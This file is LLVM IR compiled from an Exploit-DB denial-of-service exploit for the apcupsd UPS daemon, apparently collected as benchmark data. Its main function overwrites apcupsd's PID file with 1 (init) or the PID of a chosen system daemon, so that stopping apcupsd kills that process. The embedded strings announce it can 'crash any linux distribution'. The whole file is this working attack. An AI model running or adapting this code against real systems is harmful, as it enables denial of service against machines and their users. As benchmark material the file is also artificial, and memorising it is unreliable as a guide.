; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_251.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_251.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [54 x i8] c"\0AAPCUPSD can be used to crash any linux distribution\0A\00", align 1
@.str.1 = private unnamed_addr constant [57 x i8] c"or any other pid running at that moment when apcupsd is\0A\00", align 1
@.str.2 = private unnamed_addr constant [56 x i8] c"stopped or when it gets normally killed using its pid.\0A\00", align 1
@.str.3 = private unnamed_addr constant [27 x i8] c"\0ACoded by The Itch / Bse\0A\0A\00", align 1
@PIDFILE = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"%s does not exist\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.7 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@HTTPDPID = common dso_local global i8* null, align 8
@KLOGDPID = common dso_local global i8* null, align 8
@CRONDPID = common dso_local global i8* null, align 8
@SYSLOGDPID = common dso_local global i8* null, align 8
@INETDPID = common dso_local global i8* null, align 8
@IDENTDPID = common dso_local global i8* null, align 8
@SENDMAILPID = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [60 x i8] c"DoS activated, its now a matter of time until apcupsd gets\0A\00", align 1
@.str.9 = private unnamed_addr constant [27 x i8] c"restarted or stopped....\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca [5 x i8*], align 16
  %9 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str, i64 0, i64 0))
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.1, i64 0, i64 0))
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.2, i64 0, i64 0))
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 2
  br i1 %15, label %16, label %22

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @dosusage(i8* %19)
  %21 = call i32 @exit(i32 0) #3
  unreachable

22:                                               ; preds = %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @atoi(i8* %25)
  %27 = icmp sgt i32 %26, 8
  br i1 %27, label %28, label %34

28:                                               ; preds = %22
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @dosusage(i8* %31)
  %33 = call i32 @exit(i32 0) #3
  unreachable

34:                                               ; preds = %22
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 1
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @atoi(i8* %37)
  store i32 %38, i32* %9, align 4
  %39 = load i8*, i8** @PIDFILE, align 8
  %40 = call i32* @fopen(i8* %39, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %40, i32** %6, align 8
  %41 = load i32*, i32** %6, align 8
  %42 = icmp ne i32* %41, null
  br i1 %42, label %47, label %43

43:                                               ; preds = %34
  %44 = load i8*, i8** @PIDFILE, align 8
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0), i8* %44)
  %46 = call i32 @exit(i32 1) #3
  unreachable

47:                                               ; preds = %34
  %48 = load i32*, i32** %6, align 8
  %49 = call i32 @fclose(i32* %48)
  %50 = load i8*, i8** @PIDFILE, align 8
  %51 = call i32* @fopen(i8* %50, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  store i32* %51, i32** %6, align 8
  %52 = load i32, i32* %9, align 4
  %53 = icmp eq i32 %52, 1
  br i1 %53, label %54, label %57

54:                                               ; preds = %47
  %55 = load i32*, i32** %6, align 8
  %56 = call i32 @fprintf(i32* %55, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  br label %57

57:                                               ; preds = %54, %47
  %58 = load i32, i32* %9, align 4
  %59 = icmp eq i32 %58, 2
  br i1 %59, label %60, label %73

60:                                               ; preds = %57
  %61 = load i8*, i8** @HTTPDPID, align 8
  %62 = call i32* @fopen(i8* %61, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %62, i32** %7, align 8
  %63 = getelementptr inbounds [5 x i8*], [5 x i8*]* %8, i64 0, i64 4
  %64 = load i8*, i8** %63, align 16
  %65 = load i32*, i32** %7, align 8
  %66 = call i32 @fgets(i8* %64, i32 4, i32* %65)
  %67 = load i32*, i32** %7, align 8
  %68 = call i32 @fclose(i32* %67)
  %69 = load i32*, i32** %6, align 8
  %70 = getelementptr inbounds [5 x i8*], [5 x i8*]* %8, i64 0, i64 4
  %71 = load i8*, i8** %70, align 16
  %72 = call i32 @fprintf(i32* %69, i8* %71)
  br label %73

73:                                               ; preds = %60, %57
  %74 = load i32, i32* %9, align 4
  %75 = icmp eq i32 %74, 3
  br i1 %75, label %76, label %89

76:                                               ; preds = %73
  %77 = load i8*, i8** @KLOGDPID, align 8
  %78 = call i32* @fopen(i8* %77, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %78, i32** %7, align 8
  %79 = getelementptr inbounds [5 x i8*], [5 x i8*]* %8, i64 0, i64 4
  %80 = load i8*, i8** %79, align 16
  %81 = load i32*, i32** %7, align 8
  %82 = call i32 @fgets(i8* %80, i32 4, i32* %81)
  %83 = load i32*, i32** %7, align 8
  %84 = call i32 @fclose(i32* %83)
  %85 = load i32*, i32** %6, align 8
  %86 = getelementptr inbounds [5 x i8*], [5 x i8*]* %8, i64 0, i64 4
  %87 = load i8*, i8** %86, align 16
  %88 = call i32 @fprintf(i32* %85, i8* %87)
  br label %89

89:                                               ; preds = %76, %73
  %90 = load i32, i32* %9, align 4
  %91 = icmp eq i32 %90, 4
  br i1 %91, label %92, label %105

92:                                               ; preds = %89
  %93 = load i8*, i8** @CRONDPID, align 8
  %94 = call i32* @fopen(i8* %93, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %94, i32** %7, align 8
  %95 = getelementptr inbounds [5 x i8*], [5 x i8*]* %8, i64 0, i64 4
  %96 = load i8*, i8** %95, align 16
  %97 = load i32*, i32** %7, align 8
  %98 = call i32 @fgets(i8* %96, i32 4, i32* %97)
  %99 = load i32*, i32** %7, align 8
  %100 = call i32 @fclose(i32* %99)
  %101 = load i32*, i32** %6, align 8
  %102 = getelementptr inbounds [5 x i8*], [5 x i8*]* %8, i64 0, i64 4
  %103 = load i8*, i8** %102, align 16
  %104 = call i32 @fprintf(i32* %101, i8* %103)
  br label %105

105:                                              ; preds = %92, %89
  %106 = load i32, i32* %9, align 4
  %107 = icmp eq i32 %106, 5
  br i1 %107, label %108, label %121

108:                                              ; preds = %105
  %109 = load i8*, i8** @SYSLOGDPID, align 8
  %110 = call i32* @fopen(i8* %109, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %110, i32** %7, align 8
  %111 = getelementptr inbounds [5 x i8*], [5 x i8*]* %8, i64 0, i64 4
  %112 = load i8*, i8** %111, align 16
  %113 = load i32*, i32** %7, align 8
  %114 = call i32 @fgets(i8* %112, i32 4, i32* %113)
  %115 = load i32*, i32** %7, align 8
  %116 = call i32 @fclose(i32* %115)
  %117 = load i32*, i32** %6, align 8
  %118 = getelementptr inbounds [5 x i8*], [5 x i8*]* %8, i64 0, i64 4
  %119 = load i8*, i8** %118, align 16
  %120 = call i32 @fprintf(i32* %117, i8* %119)
  br label %121

121:                                              ; preds = %108, %105
  %122 = load i32, i32* %9, align 4
  %123 = icmp eq i32 %122, 6
  br i1 %123, label %124, label %137

124:                                              ; preds = %121
  %125 = load i8*, i8** @INETDPID, align 8
  %126 = call i32* @fopen(i8* %125, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %126, i32** %7, align 8
  %127 = getelementptr inbounds [5 x i8*], [5 x i8*]* %8, i64 0, i64 4
  %128 = load i8*, i8** %127, align 16
  %129 = load i32*, i32** %7, align 8
  %130 = call i32 @fgets(i8* %128, i32 4, i32* %129)
  %131 = load i32*, i32** %7, align 8
  %132 = call i32 @fclose(i32* %131)
  %133 = load i32*, i32** %6, align 8
  %134 = getelementptr inbounds [5 x i8*], [5 x i8*]* %8, i64 0, i64 4
  %135 = load i8*, i8** %134, align 16
  %136 = call i32 @fprintf(i32* %133, i8* %135)
  br label %137

137:                                              ; preds = %124, %121
  %138 = load i32, i32* %9, align 4
  %139 = icmp eq i32 %138, 7
  br i1 %139, label %140, label %153

140:                                              ; preds = %137
  %141 = load i8*, i8** @IDENTDPID, align 8
  %142 = call i32* @fopen(i8* %141, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %142, i32** %7, align 8
  %143 = getelementptr inbounds [5 x i8*], [5 x i8*]* %8, i64 0, i64 4
  %144 = load i8*, i8** %143, align 16
  %145 = load i32*, i32** %7, align 8
  %146 = call i32 @fgets(i8* %144, i32 4, i32* %145)
  %147 = load i32*, i32** %7, align 8
  %148 = call i32 @fclose(i32* %147)
  %149 = load i32*, i32** %6, align 8
  %150 = getelementptr inbounds [5 x i8*], [5 x i8*]* %8, i64 0, i64 4
  %151 = load i8*, i8** %150, align 16
  %152 = call i32 @fprintf(i32* %149, i8* %151)
  br label %153

153:                                              ; preds = %140, %137
  %154 = load i32, i32* %9, align 4
  %155 = icmp eq i32 %154, 8
  br i1 %155, label %156, label %169

156:                                              ; preds = %153
  %157 = load i8*, i8** @SENDMAILPID, align 8
  %158 = call i32* @fopen(i8* %157, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %158, i32** %7, align 8
  %159 = getelementptr inbounds [5 x i8*], [5 x i8*]* %8, i64 0, i64 4
  %160 = load i8*, i8** %159, align 16
  %161 = load i32*, i32** %7, align 8
  %162 = call i32 @fgets(i8* %160, i32 4, i32* %161)
  %163 = load i32*, i32** %7, align 8
  %164 = call i32 @fclose(i32* %163)
  %165 = load i32*, i32** %6, align 8
  %166 = getelementptr inbounds [5 x i8*], [5 x i8*]* %8, i64 0, i64 4
  %167 = load i8*, i8** %166, align 16
  %168 = call i32 @fprintf(i32* %165, i8* %167)
  br label %169

169:                                              ; preds = %156, %153
  %170 = load i32*, i32** %6, align 8
  %171 = call i32 @fclose(i32* %170)
  %172 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.8, i64 0, i64 0))
  %173 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.9, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @dosusage(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @fprintf(i32*, i8*) #1

declare dso_local i32 @fgets(i8*, i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
